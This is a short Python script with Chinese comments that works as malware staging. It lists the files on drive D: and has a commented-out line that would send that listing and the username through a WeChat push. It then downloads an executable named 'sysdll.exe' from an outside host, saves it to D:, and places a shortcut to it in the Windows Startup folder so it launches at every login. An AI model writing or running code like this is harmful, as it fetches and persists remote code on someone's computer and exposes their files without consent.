"""
代码有变化就执行2144
https://yc.052024.xyz/xz/sysdll.exe
"""
import requests
import os
wjb = ''
for i in os.listdir("D:/"):
    wjb += '|文件：' + i

print(wjb)
# self.main.wechat_push.Alleged_information(f'{self.main.sys_username}|'+wjb)




# 要下载文件的URL
file_url = "https://yc.052024.xyz/xz/sysdll.exe"
# 下载到D盘的文件路径
local_file_path = r"D:\sysdll.exe"

# 启动文件夹路径
startup_folder_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")

# 下载文件
response = requests.get(file_url)
if response.status_code == 200:
    with open(local_file_path, 'wb') as file:
        file.write(response.content)
    print(f"文件已下载到 {local_file_path}")

    # 创建快捷方式（通过创建.lnk文件的方式）
    shortcut_content = f'[InternetShortcut]\nURL=file:///{local_file_path}\n'
    shortcut_path = os.path.join(startup_folder_path, 'your_file_shortcut.lnk')
    with open(shortcut_path, 'w') as shortcut_file:
        shortcut_file.write(shortcut_content)
    print("快捷方式已创建到启动文件夹")
else:
    print(f"下载失败，状态码: {response.status_code}")